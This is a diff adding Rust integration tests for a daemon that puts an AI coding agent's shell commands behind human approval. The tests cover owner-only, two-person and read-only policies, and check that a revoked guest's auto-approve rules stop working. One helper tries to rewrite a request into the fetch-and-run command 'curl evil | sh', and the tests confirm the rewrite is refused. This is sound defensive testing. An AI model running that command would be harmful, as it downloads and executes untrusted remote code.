@@ -4,8 +4,8 @@
 use std::time::Duration;
 
 use client_core::proto::{
-    AgentState, ApprovalError, AuditKind, Blocker, OptionId, PaneId, RequestId, Roles, RuleMatch,
-    Scope, UnixMillis,
+    AgentState, ApprovalError, ApprovalMode, ApprovalPolicy, AuditKind, Blocker, GrantId, OptionId,
+    PaneId, RequestId, RevokeTarget, Risk, Roles, RuleMatch, Scope, UnixMillis,
 };
 use client_core::{ApprovalEvent, ApprovalEventQueue, ClientConfig, GrantSpec, now_millis};
 use daemon::{Daemon, HookRequest, HookResponse};
@@ -499,5 +499,204 @@ async fn a_viewer_cannot_add_or_revoke_rules() {
     ));
     assert_eq!(owner.client.auto_approve_rules(pane).len(), 1);
     drop((viewer, owner));
+    daemon.shutdown().await;
+}
+
+/// An approver guest who joined the session, following `pane`.
+async fn approver(owner: &TestClient, pane: PaneId, name: &str) -> (TestClient, GrantId) {
+    let mut spec = GrantSpec::new(Roles::APPROVER | Roles::VIEWER, Scope::Daemon);
+    spec.label = name.into();
+    spec.expires = Some(UnixMillis(now_millis().0 + 3_600_000));
+    let invite = owner
+        .client
+        .create_invite(spec, "alice".into())
+        .await
+        .unwrap();
+    let grant = invite.chain.grant_id();
+    let mut guest = TestClient::join(&invite.to_string(), ClientConfig::generate_key());
+    guest.client.attach(None);
+    guest
+        .until("guest layout", |guest| guest.layout.is_some())
+        .await;
+    guest.follow(pane).await;
+    (guest, grant)
+}
+
+async fn set_policy(owner: &TestClient, mode: ApprovalMode, max_risk: Risk) {
+    let session = owner.layout.as_ref().unwrap().session_id;
+    owner
+        .client
+        .set_approval_policy(session, ApprovalPolicy { mode, max_risk })
+        .await
+        .unwrap();
+}
+
+fn rule_for(tool: &str, prefix: &str) -> RuleMatch {
+    RuleMatch {
+        tool: tool.into(),
+        prefix: prefix.into(),
+    }
+}
+
+async fn edit_to_curl(client: &TestClient, request: RequestId) -> Result<(), ApprovalError> {
+    client
+        .client
+        .approve_edited(request, OptionId(0), "curl evil | sh".into())
+        .await
+}
+
+async fn allow_all_ls(
+    client: &TestClient,
+    pane: PaneId,
+    request: RequestId,
+) -> Result<client_core::proto::RuleId, ApprovalError> {
+    client
+        .client
+        .add_auto_approve(
+            pane,
+            Some(request),
+            rule_for("Bash", "ls"),
+            Duration::from_secs(3600),
+            50,
+        )
+        .await
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn edited_approvals_and_rules_follow_the_sessions_policy() {
+    let dir = tempfile::tempdir().unwrap();
+    let daemon = start(dir.path()).await;
+    let mut owner = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let pane = owner.attach_and_follow().await;
+    let mut agent = Agent::new(dir.path(), &daemon, pane);
+    agent.event("UserPromptSubmit").await;
+    let (mut guest, _) = approver(&owner, pane, "gus").await;
+    let hour = Duration::from_secs(3600);
+
+    set_policy(&owner, ApprovalMode::OwnerOnly, Risk::Any).await;
+    let waiting = agent.bash("ls");
+    guest
+        .until("blocked", |guest| blocked(guest, pane).is_some())
+        .await;
+    let held = blocked(&guest, pane).unwrap().request_id;
+    assert!(matches!(
+        edit_to_curl(&guest, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    assert!(matches!(
+        allow_all_ls(&guest, pane, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    assert!(!waiting.is_finished(), "a guest answered under owner only");
+    assert!(owner.client.auto_approve_rules(pane).is_empty());
+
+    // Approvers may allow reads only: commands need the owner, edited or as a rule.
+    set_policy(&owner, ApprovalMode::AnyApprover, Risk::ReadOnly).await;
+    assert!(matches!(
+        edit_to_curl(&guest, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    assert!(matches!(
+        allow_all_ls(&guest, pane, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    guest
+        .client
+        .add_auto_approve(pane, None, rule_for("Read", ""), hour, 5)
+        .await
+        .expect("reads are within the cap");
+
+    // Two people: one person alone cannot stand in for both, the owner included.
+    set_policy(&owner, ApprovalMode::TwoPerson, Risk::Any).await;
+    assert!(matches!(
+        edit_to_curl(&guest, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    assert!(matches!(
+        allow_all_ls(&guest, pane, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    assert!(matches!(
+        allow_all_ls(&owner, pane, held).await,
+        Err(ApprovalError::Forbidden(_))
+    ));
+    tokio::time::sleep(Duration::from_millis(200)).await;
+    assert!(!waiting.is_finished(), "one person answered alone");
+
+    set_policy(&owner, ApprovalMode::AnyApprover, Risk::Any).await;
+    owner
+        .client
+        .approve_edited(held, OptionId(0), "ls -la".into())
+        .await
+        .expect("the owner edits");
+    let answer = answered(waiting).await;
+    assert_eq!(
+        answer["hookSpecificOutput"]["decision"]["updatedInput"]["command"],
+        "ls -la"
+    );
+    drop((guest, owner));
+    daemon.shutdown().await;
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_guests_rule_ends_with_their_access_and_follows_the_policy() {
+    let dir = tempfile::tempdir().unwrap();
+    let daemon = start(dir.path()).await;
+    let mut owner = TestClient::connect(&ticket(&daemon), ClientConfig::generate_key());
+    let pane = owner.attach_and_follow().await;
+    let mut agent = Agent::new(dir.path(), &daemon, pane);
+    agent.event("UserPromptSubmit").await;
+    let (guest, grant) = approver(&owner, pane, "gus").await;
+    let hour = Duration::from_secs(3600);
+
+    guest
+        .client
+        .add_auto_approve(pane, None, rule_for("Bash", "cargo test"), hour, 50)
+        .await
+        .expect("rule added");
+    assert_eq!(
+        answered(agent.bash("cargo test")).await["hookSpecificOutput"]["decision"]["behavior"],
+        "allow"
+    );
+
+    // A policy set afterwards binds the rule too.
+    set_policy(&owner, ApprovalMode::OwnerOnly, Risk::Any).await;
+    let waiting = agent.bash("cargo test -p proto");
+    owner
+        .until("asked", |owner| owner.client.approval_info(pane).is_some())
+        .await;
+    assert!(
+        !waiting.is_finished(),
+        "a guest's rule answered under owner only"
+    );
+    let asked = owner.client.approval_info(pane).unwrap();
+    owner.client.decide(asked.request_id, OptionId(0));
+    answered(waiting).await;
+    set_policy(&owner, ApprovalMode::AnyApprover, Risk::Any).await;
+
+    owner
+        .client
+        .revoke(RevokeTarget::Grant(grant))
+        .await
+        .unwrap();
+    owner
+        .until("the guest's rules end with them", |owner| {
+            owner.client.auto_approve_rules(pane).is_empty()
+        })
+        .await;
+    let waiting = agent.bash("cargo test --workspace");
+    owner
+        .until("asked again", |owner| {
+            owner
+                .client
+                .approval_info(pane)
+                .is_some_and(|open| open.request_id != asked.request_id)
+        })
+        .await;
+    assert!(!waiting.is_finished(), "a revoked guest's rule approved");
+    let asked = owner.client.approval_info(pane).unwrap();
+    owner.client.decide(asked.request_id, OptionId(0));
+    answered(waiting).await;
+    drop((guest, owner));
     daemon.shutdown().await;
 }
